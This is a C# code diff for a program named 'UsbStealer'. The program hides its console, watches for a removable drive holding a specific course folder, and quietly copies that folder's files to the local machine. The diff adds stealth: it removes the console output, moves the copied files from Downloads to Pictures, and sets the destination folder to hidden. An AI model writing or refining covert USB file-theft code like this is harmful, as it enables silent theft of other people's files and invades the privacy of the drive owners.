@@ -26,7 +26,7 @@ namespace UsbStealer
 
             //скрыть консоль
             ShowWindow(handle, SW_HIDE);
-            Console.WriteLine("Start");
+            
             while (true)
             {
                 Thread.Sleep(1000);
@@ -34,15 +34,13 @@ namespace UsbStealer
                 {
                     if (dinfo.DriveType == DriveType.Removable && dinfo.IsReady == true)
                     {
-                        Console.WriteLine(dinfo.Name);
                         var path = dinfo.Name + @"смолгу\!для занятий\4П7_АИС";
-                        
-                        var newPath = KnownFolders.GetPath(KnownFolder.Downloads) + @"\нужное";
+                        var newPath = KnownFolders.GetPath(KnownFolder.Pictures) + @"\нужное";
+
                         if (Directory.Exists(path))
                         {
                             CreateDirectoies(path, newPath);
                             CopyFiles(path, newPath);
-                            Console.WriteLine("End");
                             return;
                         }
                     }
@@ -60,7 +58,6 @@ namespace UsbStealer
                 var newFilePath = file.FullName.Replace(path, newPath);
                 try
                 {
-                    Console.WriteLine(file.FullName);
                     file.CopyTo(newFilePath);
                 }
                 catch
@@ -71,7 +68,8 @@ namespace UsbStealer
 
         private static void CreateDirectoies(string path, string newPath)
         {
-            Directory.CreateDirectory(path.Replace(path, newPath));
+            DirectoryInfo dinfo = Directory.CreateDirectory(path.Replace(path, newPath));
+            dinfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
             var directories = Directory.GetDirectories(path, "*", SearchOption.AllDirectories);
             foreach (var directory in directories)
             {
